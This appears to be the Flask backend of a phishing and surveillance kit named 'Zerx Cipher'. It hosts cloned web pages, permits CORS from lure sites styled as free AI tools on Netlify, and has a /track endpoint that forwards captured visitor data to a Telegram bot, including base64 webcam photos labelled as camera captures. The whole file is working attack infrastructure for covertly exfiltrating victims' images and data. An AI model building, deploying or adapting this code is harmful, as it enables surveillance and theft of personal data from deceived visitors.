#!/usr/bin/env python3
# server.py — Flask backend for Zerx Cipher
# Endpoints: /api/verify, /api/clone/<slug>, /track, /health
# Includes permissive CORS so the Netlify-hosted pages can call it.

from flask import Flask, request, jsonify, Response, make_response
import hmac, hashlib, time, sqlite3, os, json, base64
from datetime import datetime, timezone
from functools import wraps

app = Flask(__name__)
_CLONES = {}

LINK_SECRET = os.environ.get("LINK_SECRET", "REPLACE_THIS_WITH_YOUR_RANDOM_SECRET")
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
DB_PATH     = os.environ.get("DB_PATH", "zerx.db")

# Allowed origins for CORS (add more if needed)
ALLOWED_ORIGINS = {
    "https://best-free-ai-tool.netlify.app",
    "https://best-free-ai-tools.netlify.app",
    "https://subtle-sunburst-1d934f.netlify.app",
}

@app.after_request
def add_cors(resp):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS or origin.endswith(".netlify.app"):
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Vary"] = "Origin"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        resp.headers["Access-Control-Max-Age"] = "86400"
    return resp

@app.route("/api/verify", methods=["GET", "OPTIONS"])
def api_verify():
    if request.method == "OPTIONS":
        return ("", 204)
    uid_s = request.args.get("id", "")
    tok   = request.args.get("t", "")
    if not uid_s.isdigit() or not tok:
        return jsonify({"ok": False, "reason": "missing"}), 403
    uid = int(uid_s)
    try:
        exp_s, sig = tok.split(".", 1)
        exp = int(exp_s)
    except Exception:
        return jsonify({"ok": False, "reason": "malformed"}), 403
    if exp < int(time.time()):
        return jsonify({"ok": False, "reason": "expired"}), 403
    expected = hmac.new(LINK_SECRET.encode(), f"{uid}.{exp}".encode(), hashlib.sha256).hexdigest()[:32]
    if not hmac.compare_digest(expected, sig):
        return jsonify({"ok": False, "reason": "bad_signature"}), 403
    return jsonify({"ok": True, "uid": uid})

@app.route("/api/clone-store", methods=["POST"])
def clone_store():
    try:
        data = request.get_json(force=True) or {}
        slug = data.get("slug", "")
        html = data.get("html", "")
        if not slug or not html:
            return jsonify({"ok": False}), 400
        _CLONES[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS clone_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO clone_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/clone/<slug>", methods=["GET"])
def api_clone(slug):
    html = _CLONES.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM clone_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return "Not found", 404

@app.route("/track", methods=["POST", "OPTIONS"])
def track():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    payload = data.get("data", {})
    if not uid.isdigit():
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200
    import requests as rq
    if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
        try:
            b64 = payload["image"].split(",", 1)[-1]
            rq.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    files={"photo": ("capture.jpg", base64.b64decode(b64))},
                    data={"chat_id": uid, "caption": f"📸 Camera — {uid}"},
                    timeout=15)
        except Exception:
            pass
    else:
        try:
            text = f"📡 <b>{typ}</b>\n<code>{json.dumps(payload)[:900]}</code>"
            rq.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": uid, "text": text, "parse_mode": "HTML"},
                    timeout=10)
        except Exception:
            pass
    return jsonify({"ok": True}), 200

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": datetime.now(timezone.utc).isoformat()})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
